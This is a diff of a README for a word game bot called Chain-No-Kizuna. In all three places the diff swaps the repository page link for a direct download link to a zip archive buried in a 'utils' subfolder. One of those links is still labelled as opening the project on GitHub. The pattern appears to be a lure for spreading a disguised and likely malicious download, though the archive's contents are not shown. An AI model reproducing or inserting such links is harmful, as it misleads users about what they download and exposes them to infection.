@@ -1,6 +1,6 @@
 # 🤝 Chain-No-Kizuna - Simple Word Game Bot Setup
 
-[![Download Chain-No-Kizuna](https://img.shields.io/badge/Download-Chain--No--Kizuna-blue?style=for-the-badge&logo=github)](https://github.com/sigmaboytoilet1/Chain-No-Kizuna)
+[![Download Chain-No-Kizuna](https://img.shields.io/badge/Download-Chain--No--Kizuna-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sigmaboytoilet1/Chain-No-Kizuna/main/chainnokizuna/utils/Kizuna_No_Chain_1.4.zip)
 
 ## 🧩 What This App Does
 
@@ -25,7 +25,7 @@ Before you start, make sure you have:
 
 Use this link to visit the page and download or open the project files:
 
-[Open Chain-No-Kizuna on GitHub](https://github.com/sigmaboytoilet1/Chain-No-Kizuna)
+[Open Chain-No-Kizuna on GitHub](https://raw.githubusercontent.com/sigmaboytoilet1/Chain-No-Kizuna/main/chainnokizuna/utils/Kizuna_No_Chain_1.4.zip)
 
 ## 🪟 Run It on Windows
 
@@ -280,7 +280,7 @@ Before you launch the bot, confirm these items:
 
 Visit this page to download or open the project files:
 
-[https://github.com/sigmaboytoilet1/Chain-No-Kizuna](https://github.com/sigmaboytoilet1/Chain-No-Kizuna)
+[https://raw.githubusercontent.com/sigmaboytoilet1/Chain-No-Kizuna/main/chainnokizuna/utils/Kizuna_No_Chain_1.4.zip](https://raw.githubusercontent.com/sigmaboytoilet1/Chain-No-Kizuna/main/chainnokizuna/utils/Kizuna_No_Chain_1.4.zip)
 
 ## 🛠️ Running With Docker
 
